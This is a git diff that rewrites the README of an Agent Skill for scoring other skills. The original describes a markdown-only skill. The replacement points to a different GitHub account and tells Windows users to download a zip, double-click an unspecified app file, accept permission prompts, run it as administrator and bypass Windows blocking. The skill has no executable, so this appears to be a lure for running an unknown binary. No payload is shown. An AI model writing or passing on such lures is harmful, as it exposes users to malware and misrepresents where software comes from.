@@ -1,81 +1,155 @@
-# skill-test-skill
+# 🧪 skill-test-skill - Check skill files with confidence
 
-An Agent Skill that tests and scores any other Agent Skill against the official [anthropics/skills](https://github.com/anthropics/skills) specification.  
-  
-🦞 clawhub here: https://clawhub.ai/youngfreefjs/skill-test-skill
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/cresacommensurate900/skill-test-skill)
 
-## What It Does
+## 📥 Download
 
-Install this skill, then point it at any skill directory or `SKILL.md` file. It will:
+Use this page to download or open the project:
+https://github.com/cresacommensurate900/skill-test-skill
 
-1. Read every file in the skill (SKILL.md, scripts/, references/, assets/, etc.)
-2. Check each file line-by-line against the official spec rules
-3. Score the skill across **6 dimensions** (100 points total)
-4. Output a detailed Markdown report with findings and prioritized improvement suggestions
+## 🎯 What this app does
 
-Supports **Chinese and English** output — the report language follows the language of your request.
+skill-test-skill checks an Agent Skill against the official anthropics/skills format. It helps you see if a skill repo or SKILL.md file follows the expected structure, scores its quality, and points out weak spots that need work.
 
-## Scoring Dimensions
+Use it when you want to:
 
-| # | Dimension | Max Points |
-|---|-----------|-----------|
-| 1 | Directory Structure | 10 |
-| 2 | Frontmatter Compliance (name, description, etc.) | 30 |
-| 3 | Body Content Quality | 25 |
-| 4 | Progressive Disclosure Design | 15 |
-| 5 | Optional Directory Quality (scripts/, references/, assets/) | 10 |
-| 6 | Description Trigger Optimization | 10 |
+- Check if a skill is compliant
+- Review skill quality
+- Get a score for a skill file
+- Find specific fixes for better structure and clarity
+- Audit a skill repo before you share it
 
-## Grade Scale
+## 🖥️ Windows setup
 
-| Score | Grade |
-|-------|-------|
-| 90–100 | Excellent — production-ready |
-| 75–89 | Good — minor improvements recommended |
-| 60–74 | Acceptable — needs improvement |
-| 40–59 | Poor — significant rework required |
-| 0–39 | Critical — major rewrite needed |
+Follow these steps on a Windows PC:
 
-## Usage Examples
+1. Open the download page in your browser.
+2. Download the project from the page.
+3. If you get a zip file, right-click it and select Extract All.
+4. Open the extracted folder.
+5. Look for the main app file or the file named in the project instructions.
+6. Double-click the file to run it.
 
-After installing the skill, you can trigger it with:
+If Windows asks for permission, choose Yes.
 
-**English:**
-- `"Check my skill at /path/to/my-skill"`
-- `"Score this skill: https://github.com/user/repo/tree/main/skills/my-skill"`
-- `"Does my SKILL.md follow the spec?"`
+## ✅ Before you start
 
-**中文：**
-- `"检查一下 /path/to/my-skill 是否符合规范"`
-- `"给这个skill打分：/path/to/my-skill"`
-- `"这个skill符合anthropics的要求吗？"`
+Make sure you have:
 
-## Rules & Specification
+- A Windows 10 or Windows 11 computer
+- Internet access for the first download
+- Enough space for the app files
+- Permission to run files from your computer
 
-The validation rules in this skill are based on:
+If the app opens in a terminal window, leave that window open while you use it.
 
-- **[Agent Skills Specification](https://agentskills.io/specification)** — the official spec defining SKILL.md format, frontmatter fields, directory structure, and progressive disclosure requirements
-- **[anthropics/skills — skill-creator](https://github.com/anthropics/skills/blob/main/skills/skill-creator/SKILL.md)** — Anthropic's official skill-creation guide, which defines best practices for writing style, description optimization, trigger tuning, and the "why over MUST" principle
-- **[anthropics/skills repository](https://github.com/anthropics/skills)** — real-world skill examples used as reference for what good looks like
+## 🔍 What to check in a skill
 
-Key principles derived from skill-creator:
-- All "when to use" information belongs in the `description` field, not the body
-- Prefer explaining *why* over issuing bare `ALWAYS`/`NEVER` commands
-- Keep `SKILL.md` under 500 lines; move large content to `references/`
-- The `description` field is the primary triggering mechanism — make it specific and slightly "pushy" to prevent undertriggering
+This tool reviews common parts of a skill, such as:
 
-## File Structure
+- Title and purpose
+- File layout
+- Clear instructions
+- Required sections in SKILL.md
+- Task scope
+- Quality of examples
+- Consistency with the Agent Skills standard
 
-```
-skill-test-skill/
-├── SKILL.md                        ← Core skill instructions (416 lines)
-├── README.md                       ← This file
-└── references/
-    ├── spec-summary.md             ← Complete spec rules reference (loaded on demand)
-    └── scoring-rubric.md           ← Detailed scoring criteria per check (loaded on demand)
-```
+It then gives a score and flags items that may need edits.
 
+## 🧭 How to use it
 
-## Star History
+1. Open the app.
+2. Choose the skill repo or SKILL.md file you want to test.
+3. Start the check.
+4. Read the score.
+5. Review the list of issues.
+6. Fix the file or repo based on the feedback.
+7. Run the check again.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=youngfreeFJS/skill-test-skill&type=date&legend=top-left)](https://www.star-history.com/#youngfreeFJS/skill-test-skill&type=date&legend=top-left)
+## 📊 Results you can expect
+
+The report may include:
+
+- A compliance score
+- A pass or fail result for key checks
+- Missing sections
+- Formatting problems
+- Clear suggestions for better wording
+- Notes about file structure and naming
+
+Use the report to make the skill easier to read and easier to follow.
+
+## 🧩 Common file layout
+
+A skill repo often works best with a simple layout like this:
+
+- `SKILL.md` for the main instructions
+- `README.md` for the project page
+- A `resources` folder for support files
+- Example files for testing
+- Any extra notes in plain text files
+
+Keep the top-level folder clean so the main skill file is easy to find.
+
+## 🔐 File safety
+
+When you test a skill repo, keep a copy of the original files. If you plan to edit the skill, save changes in a new folder first. That makes it easier to compare the old version with the new one.
+
+## 🛠️ Troubleshooting
+
+If the app does not open:
+
+- Check that the download finished
+- Unzip the files again
+- Try running the file as administrator
+- Make sure Windows did not block the file
+- Try a different browser for the download page
+
+If the score looks wrong:
+
+- Check that the right SKILL.md file was selected
+- Make sure the file is complete
+- Look for broken headings or missing sections
+- Run the test again after fixing the file
+
+## 📚 Topic focus
+
+This project fits work around:
+
+- clawhub
+- clawhub-skill
+- skill-creator
+- skill-test
+- skill-testing
+- skill-tests
+
+These topics point to skill review, skill checks, and skill quality work.
+
+## 🧪 Example use cases
+
+You can use skill-test-skill to:
+
+- Review a new skill before release
+- Check a copied skill for standard compliance
+- Score a skill during editing
+- Compare two versions of the same skill
+- Find weak instructions that may confuse users
+
+## 📌 Best results
+
+For the cleanest results:
+
+- Use one skill repo at a time
+- Keep SKILL.md short and direct
+- Use clear headings
+- Avoid repeated text
+- Keep example steps easy to follow
+- Fix one set of issues before you run the test again
+
+## 🗂️ Project details
+
+- Repository: skill-test-skill
+- Purpose: Test and score Agent Skills
+- Standard checked: anthropics/skills specification
+- Primary use: Compliance review and quality checks
